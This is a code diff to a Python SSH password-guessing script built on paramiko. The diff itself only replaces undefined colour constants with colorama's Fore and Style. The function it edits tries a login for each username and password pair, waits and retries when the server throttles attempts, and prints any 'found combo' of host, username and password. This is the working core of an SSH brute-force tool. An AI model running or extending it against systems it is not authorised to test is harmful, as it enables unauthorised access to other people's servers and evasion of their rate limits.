@@ -4,6 +4,11 @@ import paramiko
 import socket
 import time
 
+import colorama
+from colorama import Fore, Style
+
+colorama.init()
+
 
 def is_ssh_open(hostname, username, password):
     # initialize SSH client
@@ -14,19 +19,19 @@ def is_ssh_open(hostname, username, password):
         client.connect(hostname=hostname, username=username, password=password, timeout=3)
     except socket.timeout:
         # this is when host is unreachable
-        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
+        print(f"{Fore.RED}[!] Host: {hostname} is unreachable, timed out.{Style.RESET_ALL}")
         return False
     except paramiko.AuthenticationException:
         print(f"[!] Invalid credentials for {username}:{password}")
         return False
     except paramiko.SSHException:
-        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
+        print(f"{Fore.BLUE}[*] Quota exceeded, retrying with delay...{Style.RESET_ALL}")
         # sleep for a minute
         time.sleep(60)
         return is_ssh_open(hostname, username, password)
     else:
         # connection was established successfully
-        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
+        print(f"{Fore.GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{Style.RESET_ALL}")
         return True
 
 
